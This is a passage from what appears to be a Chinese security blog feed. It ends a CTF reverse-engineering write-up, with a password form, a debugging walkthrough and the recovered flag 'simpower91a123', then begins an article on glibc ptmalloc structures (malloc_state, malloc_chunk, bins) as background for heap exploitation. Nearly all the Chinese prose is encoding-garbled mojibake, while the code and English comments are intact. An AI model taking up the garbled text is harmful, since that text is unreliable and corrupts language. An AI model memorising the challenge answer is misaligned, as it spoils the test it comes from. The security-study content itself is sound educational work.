<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;pswd&quot;</span> <span class="attr">size</span>=<span class="string">39</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">button</span> <span class="attr">value</span>=<span class="string">&quot;checkMyFlag&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;ckpswd();&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>ä» js é‡Œé¢çœ‹åˆ°ä¸€éƒ¨åˆ†ä»£ç é€»è¾‘ï¼Œé¦–å…ˆ key æ˜¯ç”± simpower91 å¼€å¤´ï¼Œåè·Ÿä¸€å®šé•¿åº¦çš„å…¶ä»–å­—ç¬¦ï¼ŒéªŒè¯æ­£ç¡®ä¹‹åä¼šè°ƒç”¨ sptWBCallback å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°è´Ÿè´£ä¸ç¨‹åºä¸­çš„åŸç”Ÿä»£ç è¿›è¡Œäº¤äº’ï¼Œå®ƒä¼šå°† simpower91 è¿›è¡Œå‰”é™¤ï¼Œåªç•™ä¸‹å‰©ä½™çš„å­—ç¬¦åˆ°ç¨‹åºä¸­è¿›è¡Œä¸‹ä¸€æ­¥éªŒè¯ã€‚</p>
<p>é€šè¿‡åŠ¨æ€è°ƒè¯•åˆ†æï¼Œ00492088 å¤„çš„å‡½æ•°ç”¨æ¥å¤„ç† sptWBCallback  å‘é€çš„è¯·æ±‚ï¼Œå…¶å†…éƒ¨è°ƒç”¨äº†ä¸€ä¸ªéšè—å‡½æ•°ï¼Œé™æ€åˆ†æä¸èƒ½ç¡®å®šå®ƒçš„åœ°å€ï¼Œé€šè¿‡è°ƒè¯•å¾—åˆ°éšè—å‡½æ•°çš„åœ°å€ä¸º 00493F70ï¼Œç®€å•åˆ†æä¸€ä¸‹è¿™ä¸ªå‡½æ•°å¯ä»¥å¾—çŸ¥æˆ‘ä»¬çš„è¾“å…¥ä¸º 4 ä¸ªå­—èŠ‚</p>
<p>è¿™ä¸ªå‡½æ•°åˆè°ƒç”¨äº†å¾ˆå¤šå…¶ä»–å‡½æ•°ï¼Œæˆ‘åŠ¨æ€è°ƒè¯•äº†å¾ˆä¹…ä¹Ÿæ²¡æœ‰çœ‹æ‡‚åœ¨åšäº›ä»€ä¹ˆï¼Œäºæ˜¯æ¢äº†ä¸€ç§æ€è·¯ï¼Œå½“ç¨‹åºè·å–åˆ°è¾“å…¥çš„æ—¶å€™ï¼Œåœ¨ç›¸åº”çš„å†…å­˜åŒºåŸŸä¸‹ç¡¬ä»¶æ–­ç‚¹ï¼ŒF9 å‡ æ¬¡æ¥åˆ° 0047162C å‡½æ•°å†…éƒ¨ï¼Œä»è¿™é‡Œå¼€å§‹å»æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œäº†ä¸€å †çœ‹ä¸æ‡‚çš„æ“ä½œï¼Œä¸è¿‡åœ¨ 0x94000 åœ°å€é™„è¿‘æˆ‘å‘ç°äº†ä¸€äº›åŠ¨æ€ç”Ÿæˆçš„æ•°æ®ï¼Œè€Œä¸”ç¨‹åºè¿›å…¥äº†æŸç§å¾ªç¯å½“ä¸­ï¼Œæ¯æ¬¡å¾ªç¯éƒ½ä¼šå¯¹è¿™é‡Œçš„æ•°æ®è¿›è¡Œä¸€äº›æ“ä½œã€‚</p>
<p>ç›´åˆ°ä¸€æ¡ long jmp æŒ‡ä»¤ï¼Œä¼šå°†ç¨‹åºæ‰§è¡Œæµå®šä½åˆ°è¿™æ®µæ•°æ®ä¸­ï¼Œè¿™æ—¶æˆ‘æ‰å‘ç°æ‰€è°“çš„æ•°æ®åŸæ¥æ˜¯ä¸€æ®µåŠ¨æ€ç”Ÿæˆçš„ shellcodeï¼Œå…¶åŠŸèƒ½æ˜¯å°†æ¯ä¸ªå­—ç¬¦åŠ ä¸Š 0x7fï¼Œä¹‹åä¼šå’Œé¢„ç½®çš„æ•°æ®è¿›è¡Œå¯¹æ¯”ã€‚é‚£ä¹ˆé€šè¿‡å•æ­¥è·Ÿè¸ªæ‰¾åˆ°è¿™ 4 ç»„æ•°æ®è§£å¯†å°±å¯ä»¥å¾—åˆ°çœŸæ­£çš„å¯†ç ã€‚</p>
<p>æœ€ç»ˆå¾—åˆ° flag ï¼šsimpower91a123</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>glibc ä¸­çš„ malloc ä¸ free æ¦‚è¿° (ä¸€)</title>
    <url>/2019/03/07/glibc_analyse1/</url>
    <content><![CDATA[<h2 id="ã€‡"><a href="#ã€‡" class="headerlink" title="ã€‡."></a>ã€‡.</h2><p>æœ€è¿‘åšä¸€äº›å †åˆ©ç”¨çš„é¢˜ç›®æ—¶æ„Ÿè§‰åŸºç¡€æŒæ¡çš„ä¸æ˜¯å¾ˆç‰¢é ï¼Œä¹‹å‰æ²¡æœ‰ä»”ç»†çš„ç ”ç©¶è¿‡ glibc ä¸­çš„å†…å­˜ç®¡ç†ç­–ç•¥ï¼Œå¯¼è‡´é‡åˆ°æŸäº›é¢˜ç›®çš„æ—¶å€™æ€»æ˜¯ä¼šå¿½ç•¥æ‰é‡è¦çš„ç»†èŠ‚(libc å±‚é¢)ï¼Œæ‰€ä»¥è¿™æ¬¡å°±æ¥ä»”ç»†ç ”ç©¶ä¸€ä¸‹ malloc å’Œ free çš„å®ç°ã€‚<br><strong>æ–‡ç« ä¸­éš¾å…æœ‰ç–æ¼ï¼Œæ¬¢è¿å¤§å®¶æŒ‡æ­£ã€‚</strong></p>
<p>Update: 2020-11-02</p>
<span id="more"></span>

<h2 id="å†…å­˜ç®¡ç†"><a href="#å†…å­˜ç®¡ç†" class="headerlink" title="å†…å­˜ç®¡ç†"></a>å†…å­˜ç®¡ç†</h2><p>åŠ¨æ€å†…å­˜ç®¡ç†æ˜¯å¾ˆé‡è¦çš„åŠŸèƒ½ï¼Œå†…å­˜ä¸€ç›´éƒ½æ˜¯å¾ˆå®è´µçš„èµ„æºï¼Œä¸€ä¸ªå¥½çš„å†…å­˜ç®¡ç†ç­–ç•¥å¯ä»¥æå¤§åœ°æå‡ç³»ç»Ÿæ€§èƒ½ï¼Œå°± C å†…å­˜ç®¡ç†è€Œè¨€ï¼Œä¸»è¦çš„ç®¡ç†ç¨‹åºæœ‰</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Doug Lea Malloc</span><br><span class="line">BSD Malloc</span><br><span class="line">Hoard</span><br><span class="line">TCMalloc</span><br><span class="line">ptmalloc</span><br></pre></td></tr></table></figure></div>

<p>ç›®å‰ä¸»æµ Linux ç³»ç»Ÿæ‰€ä½¿ç”¨çš„éƒ½æ˜¯ ptmallocï¼Œç”± Wolfram Gloger åŸºäº Doug Lea Malloc ä¿®æ”¹è€Œæ¥ã€‚ptmalloc åŒ…æ‹¬ malloc free ç­‰ä¸€ç»„å‡½æ•°ï¼Œå®ç°äº†åŠ¨æ€çš„å†…å­˜ç®¡ç†ï¼ŒåŒºåˆ«ä¸€ä¸ªå†…å­˜ç®¡ç†å™¨å¥½åçš„é‡è¦æ ‡å‡†å°±æ˜¯ åˆ†é…å’Œé‡Šæ”¾å†…å­˜çš„é€Ÿåº¦ã€‚</p>
<p>å½“ Linux åŠ è½½äº†ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºæ—¶ï¼Œä¼šå…ˆå°†ç¨‹åºä»ç¡¬ç›˜ä¸Šæ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œ ä»¥ 32 ä½ç¨‹åºä¸ºä¾‹ï¼Œæ˜ å°„çš„é¡ºåºä¸º .textæ®µã€.dataæ®µã€.bssæ®µï¼Œæ¥ç€ä¼šç”Ÿæˆ stack åŒºåŸŸä»¥åŠ heap åŒºåŸŸã€mmap åŒºåŸŸã€‚ä¸€ä¸ªå…¸å‹çš„ 32 ä½ç¨‹åºçš„å†…å­˜å¸ƒå±€å¤§è‡´å¦‚ä¸‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_1.png"
                      alt="malloc_free_1.png"
                ></p>
<p>å…¶ä¸­ï¼Œå†…æ ¸åŒºåŸŸå æ® 1GB ç©ºé—´ï¼Œç”¨æˆ·ç¨‹åºå æ® 3GB ç©ºé—´ï¼Œä½†æ˜¯åŒä¸€æ—¶é—´å¯ä»¥è¿è¡Œå¤šä¸ªç¨‹åºï¼Œå¦‚æœæ•´ä¸ªå†…å­˜è¢«ä¸€ä¸ªç¨‹åºå…¨éƒ¨å æ®çš„è¯ï¼Œå…¶ä»–ç¨‹åºæ˜¯ä¸æ˜¯å°±æ— æ³•è¿è¡Œäº†å‘¢ï¼Ÿå…¶å®ä¸ç„¶ï¼Œå¯ä»¥å‚è€ƒ windows çš„å®ç°æ–¹æ³•ï¼Œç³»ç»Ÿä¸ºæ¯ä¸ªç¨‹åºåˆ†é…äº†è™šæ‹Ÿå†…å­˜ï¼Œåªæ˜¯åœ¨é€»è¾‘ä¸Šæ¯ä¸ªç¨‹åºå æ®ç€æ•´å—å†…å­˜ï¼Œä½†å®é™…ä¸Šç‰©ç†å†…å­˜ä¸­åŒæ—¶å­˜åœ¨å¾ˆå¤šç¨‹åºï¼Œæ“ä½œç³»ç»Ÿé€šè¿‡è™šæ‹Ÿå†…å­˜ç®¡ç†å™¨å°†è™šæ‹Ÿåœ°å€æ˜ å°„åˆ°ç‰©ç†åœ°å€ä¸Šé¢ï¼Œä¿è¯ç³»ç»Ÿæ­£å¸¸å·¥ä½œã€‚</p>
<p>å®ç°å†…å­˜ç®¡ç†ä¸»è¦æœ‰ä¸‰ä¸ªå±‚é¢ï¼Œåˆ†åˆ«æ˜¯ç”¨æˆ·ç®¡ç†å±‚ã€C è¿è¡Œæ—¶åº“å±‚ä»¥åŠæ“ä½œç³»ç»Ÿå±‚ï¼Œæ“ä½œç³»ç»Ÿå±‚æä¾›äº†æœ€åº•å±‚çš„å†…å­˜ç®¡ç†æ–¹æ¡ˆå¦‚ syscallï¼Œlinux æ“ä½œç³»ç»Ÿæä¾›äº† brk() å‡½æ•°æ¥å®ç°å†…å­˜çš„åˆ†é…ï¼Œè€Œ C è¿è¡Œæ—¶åº“åˆ™æä¾›äº† sbrk() å‡½æ•°ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„ malloc free ç­‰ç±»ä¼¼çš„å‡½æ•°å°±æ˜¯ä½¿ç”¨äº† C è¿è¡Œåº“æä¾›çš„å‡½æ•°ã€‚</p>
<p>å½“ç¨‹åºå‘æ“ä½œç³»ç»Ÿç”³è¯·åŠ¨æ€å†…å­˜æ—¶ï¼Œç³»ç»Ÿä¼šè°ƒç”¨ç›¸åº”çš„å‡½æ•°åˆ†é…å†…å­˜ï¼Œä½†æ˜¯è¿™ç§åˆ†é…å¹¶ä¸æ˜¯å®æ—¶çš„ï¼Œé¦–å…ˆå†…æ ¸ä¼šç»™ç¨‹åºåˆ†é…ä¸€ä¸ªçº¿æ€§åŒº(è™šæ‹Ÿå†…å­˜)ï¼Œåªæœ‰å½“ç”¨æˆ·å¼€å§‹ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œæ‰ä¼šåˆ†é…ç‰©ç†é¡µé¢ã€‚å½“é‡Šæ”¾ä¸€å—å†…å­˜æ—¶ï¼Œä¼šé€šè¿‡çº¿æ€§åŒºæ‰¾åˆ°ç‰©ç†é¡µé¢ï¼Œç„¶åæ‰æ‰§è¡Œé‡Šæ”¾æ“ä½œã€‚</p>
<p>ä¸ºäº†æé«˜å†…å­˜ç®¡ç†æ•ˆç‡ï¼Œptmalloc è®¾ç½®äº†ä¸€äº›ç¼“å†²åŒºï¼Œå½“ç”¨æˆ·åˆ†é…å†…å­˜æ—¶ï¼Œptmalloc ä¼šä¼˜å…ˆæ£€æŸ¥ç¼“å†²åŒºä¸­æ˜¯å¦å­˜åœ¨åˆé€‚çš„ç©ºé—´ï¼Œå¦‚æœå­˜åœ¨å°±ç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œè¿™æ ·å¤§å¤§é™ä½äº†å‘å†…æ ¸ç”³è¯·ç©ºé—´çš„æ¬¡æ•°ã€‚åŒæ ·çš„ï¼Œå½“ç”¨æˆ·é‡Šæ”¾æŸå—å†…å­˜æ—¶ï¼Œptmalloc ä¼šå°†è¿™å—å†…å­˜æ’å…¥å¯¹åº”çš„ç¼“å†²åŒºå†…ï¼Œä»¥ä¾¿äºä¸‹ä¸€æ¬¡åˆ†é…ä½¿ç”¨ï¼Œè¿™äº›ç¼“å†²åŒºå°±æ˜¯æ‰€è°“çš„ fastbinã€smallbin ç­‰ç­‰é“¾è¡¨ã€‚</p>
<p>ptmalloc çš„å‡ ä¸ªç‰¹æ€§</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. éœ€è¦é•¿æ—¶é—´ä¿å­˜ã€ä½¿ç”¨çš„å†…å­˜(å­˜æ´»æœŸé•¿)çš„åˆ†é…ä½¿ç”¨ mmap</span><br><span class="line">2. å¾ˆå¤§çš„å†…å­˜åˆ†é…ä½¿ç”¨ mmap</span><br><span class="line">3. å­˜æ´»æœŸçŸ­çš„å†…å­˜å—ä½¿ç”¨ brk åˆ†é…</span><br><span class="line">4. å°½é‡åªç¼“å­˜è¾ƒå°çš„å†…å­˜å—ï¼Œå¾ˆå¤§çš„å†…å­˜å—åœ¨é‡Šæ”¾ä¹‹åç«‹å³å½’è¿˜æ“ä½œç³»ç»Ÿ</span><br><span class="line">5. ç©ºé—²çš„å†…å­˜å—(å¤„äºç¼“å†²åŒºä¸­)åªåœ¨ malloc å’Œ free æ—¶è¿›è¡Œåˆå¹¶</span><br></pre></td></tr></table></figure></div>

<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>æœ¬éƒ¨åˆ†æ ¹æ® malloc.c ä»£ç æ³¨é‡Šä»¥åŠé€»è¾‘å¯¹ malloc è¿›è¡Œäº†ç®€è¦åˆ†æã€‚</p>
<p>ä»£ç å¯ä»¥åœ¨ <a class="link"   href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#_M/void" >woboq<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> æ‰¾åˆ°ã€‚</p>
<h3 id="ptmalloc-çš„é€‚åº”æ€§"><a href="#ptmalloc-çš„é€‚åº”æ€§" class="headerlink" title="ptmalloc çš„é€‚åº”æ€§"></a>ptmalloc çš„é€‚åº”æ€§</h3><p>ä¸€ä¸ªå†…å­˜ç®¡ç†å™¨æœ€ç†æƒ³çš„æƒ…å†µæ˜¯é’ˆå¯¹é¡¹ç›®è¿›è¡Œä¸“é—¨çš„ä¼˜åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸ªé¡¹ç›®é’ˆå¯¹è‡ªèº«æƒ…å†µå¼€å‘å‡ºçš„å†…å­˜ç®¡ç†å™¨æ‰æ˜¯æœ€ä¼˜çš„ï¼Œä½†æ˜¯è¿™æ ·åšçš„æˆæœ¬å¤ªé«˜ï¼Œè€Œä¸”å¼€å‘ä¸€ä¸ªå†…å­˜ç®¡ç†å™¨éš¾åº¦ä¹Ÿæ˜¯å¾ˆé«˜çš„ï¼Œæ—¢è¦è€ƒé‡å’Œå†…æ ¸çš„å…¼å®¹æ€§ï¼Œåˆè¦å¯ç§»æ¤ï¼Œæ•ˆç‡è¦é«˜å¹¶ä¸”ç¨³å®šï¼Œæ‰€ä»¥ï¼Œæœ€å¥½çš„åŠæ³•æ˜¯æœ‰ä¸€ä¸ªæŠ˜ä¸­çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œå„æ–¹é¢ä¸éœ€è¦å¾ˆçªå‡ºï¼Œä½†æ˜¯é€‚ç”¨æ€§å¹¿ï¼Œå¯ä»¥å¾ˆå¥½åœ°å…¼å®¹åœ¨å„ç§å¤§å‹é¡¹ç›®ä¸­ã€‚</p>
<p>ptmalloc çš„è®¾è®¡æ€æƒ³å°±æ˜¯è¿™æ ·ï¼Œå®ƒå…·æœ‰è‰¯å¥½çš„å…¼å®¹æ€§ã€å¯ç§»æ¤æ€§ã€ç¨³å®šæ€§ï¼Œå¹¶ä¸”å…¼å…·æ•ˆç‡ï¼Œè¿™æ ·ä¸€ä¸ªå†…å­˜ç®¡ç†å™¨å¯¹äºå¼€å‘ä¸€äº›æ­£å¸¸çš„é¡¹ç›®è¶³å¤Ÿäº†ã€‚</p>
<h3 id="main-arena-and-non-main-arena"><a href="#main-arena-and-non-main-arena" class="headerlink" title="main_arena and non_main_arena"></a>main_arena and non_main_arena</h3><p>åˆç§°ä¸ºä¸»åˆ†é…åŒºå’Œéä¸»åˆ†é…åŒºï¼Œmain_arena æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œå®šä¹‰åœ¨ malloc.c ä¸­çš„ malloc_state</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>ç»“æ„ä½“å¯¹æ¯ä¸€ä¸ªæˆå‘˜ç»™å‡ºäº†è§£é‡Šï¼Œç¬¬ä¸€ä¸ªæˆå‘˜æ˜¯ linux ä¸‹çš„é”ï¼ŒDoug Lea å®ç°çš„å†…å­˜åˆ†é…å™¨åªæœ‰ä¸€ä¸ªä¸»åˆ†é…åŒºï¼Œä¸ºäº†å…¼å®¹å¤šçº¿ç¨‹ï¼Œæ¯æ¬¡åˆ†é…å†…å­˜ä¹‹å‰éƒ½è¦å¯¹ä¸»åˆ†é…åŒºåŠ é”ï¼Œé˜²æ­¢å¤šçº¿ç¨‹å¯¹å†…å­˜åˆ†é…é€ æˆå½±å“ï¼Œè¿™æ ·å°±å¯¼è‡´å¤šçº¿ç¨‹é”çš„æ¿€çƒˆç«äº‰ï¼Œé™ä½äº†å†…å­˜åˆ†é…æ•ˆç‡ï¼Œè€Œ ptmalloc æ”¯æŒå¤šçº¿ç¨‹ï¼Œå¢åŠ äº† non_main_arena (éä¸»åˆ†é…åŒº)ï¼Œæ‰€è°“ non_main_arena å…¶ç»“æ„å’Œä¸»åˆ†é…åŒºç›¸åŒï¼Œå¾ˆå¤šåˆ†é…åŒºé€šè¿‡ç¯å½¢é“¾è¡¨ç›¸äº’ä¸²è”ï¼Œè¿™æ ·ï¼Œå¤šä¸ªçº¿ç¨‹å°±æ— éœ€äº‰å¤ºåŒä¸€ä¸ªåˆ†é…åŒºäº†ã€‚ä½†æ˜¯åˆ†é…åŒºçš„æ•°é‡æ¯•ç«Ÿæ˜¯æœ‰é™çš„ï¼Œåœ¨æç«¯æƒ…å†µä¸‹å¤šä¸ªçº¿ç¨‹è¿˜æ˜¯ä¼šç«äº‰åŒä¸€ä¸ªåˆ†é…åŒºï¼Œæ‰€ä»¥é”ä¾æ—§æœ‰ç”¨ï¼Œå…ˆåŠ é”çš„è¿›ç¨‹å¯ä»¥ä¼˜å…ˆä½¿ç”¨åˆ†é…åŒºï¼Œå¦‚æœå…¨éƒ¨åˆ†é…åŒºéƒ½è¢«åŠ é”ï¼Œé‚£ä¹ˆåé¢çš„è¿›ç¨‹å°±ä¼šè¿›å…¥é˜»å¡çŠ¶æ€ã€‚å¯¹äº 32 ä½ç³»ç»Ÿæ¥è¯´ï¼Œarena æœ€å¤šä¸ºæ ¸å¿ƒæ•°é‡çš„ 2 å€ï¼Œ64 ä½ç³»ç»Ÿä¸‹ arena æœ€å¤šä¸ºæ ¸å¿ƒæ•°é‡çš„ 8 å€ã€‚</p>
<p>ç¬¬äºŒä¸ªæˆå‘˜æ˜¯æ ‡å¿—ä½ï¼Œç¬¬ä¸‰ä¸ªæˆå‘˜ç”¨æ¥æ ‡è¯†æœ€è¿‘æ˜¯å¦æœ‰æ–°çš„å†…å­˜å—è¢«æ’å…¥ fastbin é“¾è¡¨ã€‚</p>
<p>ç¬¬å››ä¸ªæˆå‘˜æ˜¯ fastbin é“¾è¡¨ï¼Œç¬¬äº”ä¸ªæˆå‘˜æ˜¯ top chunk çš„åœ°å€ï¼Œåœ¨å †åˆ©ç”¨ä¸­å¯èƒ½ä¼šç”¨åˆ°ã€‚ç¬¬å…­ä¸ªæˆå‘˜æ ‡è¯†æœ€åä¸€æ¬¡æ‹†åˆ† top chunk å¾—åˆ°çš„å‰©ä½™éƒ¨åˆ†ï¼Œç¬¬ä¸ƒä¸ªæˆå‘˜æ˜¯ smallbinã€largebin å’Œ unsortedbin çš„é›†åˆä½“ï¼Œä¸€å…±æœ‰ 126 ä¸ªè¡¨é¡¹ã€‚</p>
<blockquote>
<p>è¡¥ï¼šä¸ºä»€ä¹ˆæœ‰ 126 ä¸ªè¡¨é¡¹ï¼Ÿè¿™æ˜¯ç”±äº bin[0] å’Œ bin[127] æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œå¹¶ä¸” bin[1] æ˜¯æ•´ä¸ª bin çš„å¤´éƒ¨ã€‚ æ³¨æ„ bin å®šä¹‰çš„æ•°é‡ä¸º NBINS * 2 - 2 &#x3D; 254ï¼Œä¸ºä»€ä¹ˆæ˜¯ 254ï¼Ÿ è¿™æ˜¯ç”±äºç¼“å†²åŒºé“¾è¡¨ä¸»è¦æœ‰ fd å’Œ bk ä¸¤ä¸ªæŒ‡é’ˆï¼Œsmallbin 62 ä¸ªã€largebin 63 ä¸ªï¼ŒåŠ åœ¨ä¸€èµ·æ˜¯ 125 ä¸ªï¼Œå†åŠ ä¸Šä¸€ä¸ªå¤´ç»“ç‚¹ bin[1] å…± 126 ä¸ªè¡¨é¡¹ï¼Œæ¢ç®—æˆ index ä¸€å…±æœ‰ 252 ä¸ªï¼Œæ‰€ä»¥ 254 ä¸ªæŒ‡é’ˆç©ºé—´æ˜¯å®Œå…¨è¶³å¤Ÿçš„ï¼</p>
</blockquote>
<p>ç¬¬å…«ä¸ªæˆå‘˜å¯ä»¥è§†ä¸ºä¸€å¼ åœ°å›¾ï¼Œæ ‡è¯†é“¾è¡¨æ˜¯å¦ä¸ºç©ºã€‚ç¬¬ä¹ä¸ªæˆå‘˜æ˜¯ next æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ª arenaã€‚</p>
<p>ç¬¬åä¸ªæˆå‘˜æŒ‡å‘ä¸‹ä¸€ä¸ªä¸ºç©ºçš„ arenaã€‚ç¬¬åä¸€ä¸ªæˆå‘˜ç”¨æ¥æ ‡è¯†ç»‘å®šåœ¨å½“å‰ arena çº¿ç¨‹çš„æ€»é‡ã€‚</p>
<p>æœ€åä¸¤ä¸ªæˆå‘˜ç”¨æ¥è·Ÿè¸ªå½“å‰è¢«ç³»ç»Ÿåˆ†é…çš„å†…å­˜æ€»é‡ã€‚</p>
<p>è¿™ä¸ª glibc ç‰ˆæœ¬æ¯”è¾ƒæ–°çš„ï¼Œæœ‰ä¸€äº›æ–°åŠ å…¥çš„å®šä¹‰ã€‚</p>
<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>chunk ç§°ä¸ºå †å—ï¼Œæ˜¯å †çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå½“ç”¨æˆ·ç”³è¯·å†…å­˜å—æ—¶ï¼Œç³»ç»Ÿå°±ä¼šå°†ç©ºé—´ä»¥å †å—çš„å½¢å¼è¿”å›ï¼Œå †å—å…·æœ‰ä¸€å®šçš„ç»“æ„ï¼Œä¸”æŒ‰ç…§å¤§å°åˆ†ä¸º 4 ç±»ï¼Œå †å—çš„ç»“æ„å®šä¹‰åœ¨ malloc.c ä¸­ï¼Œä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>åŸºæœ¬ç»“æ„åŒ…å« 6 ä¸ªæˆå‘˜ï¼Œé¦–å…ˆæ˜¯ mchunk_prev_sizeï¼Œå¦‚æœå½“å‰å †å—çš„å‰ä¸€ä¸ªå †å—æ˜¯ç©ºé—²çš„ï¼Œé‚£ä¹ˆæ­¤å­—æ®µå°±æ˜¯å‰ä¸€ä¸ªå †å—çš„ sizeã€‚</p>
<p>æ¥ç€æ˜¯å½“å‰å †å—çš„ sizeï¼Œç„¶åæœ‰ä¸¤ä¸ªæŒ‡é’ˆï¼Œç”±äºå„ç§ bin çš„å­˜åœ¨ï¼Œå½“å †å—è¢«é‡Šæ”¾åä¼šè¿›å…¥å¯¹åº”çš„ç¼“å†²åŒºä¸­ï¼Œå¹¶ä¸”ä»¥é“¾è¡¨çš„å½¢å¼å­˜åœ¨ï¼Œè¿™é‡Œçš„ fd å’Œ bk å°±æ˜¯é“¾è¡¨çš„å‰å‘åå‘æŒ‡é’ˆï¼Œæœ€åä¸¤ä¸ªä¹Ÿæ˜¯æŒ‡é’ˆï¼Œä½†æ˜¯å®ƒä»¬åªä¼šå‡ºç°åœ¨ largebin chunk ä¸­ï¼Œå…·ä½“ä¼šåœ¨åé¢æåˆ°ã€‚</p>
<p>ä¸€ä¸ªå †å—å¯èƒ½ä¼šæ˜¯ä¸‹é¢çš„çŠ¶æ€</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">      mem-&gt; 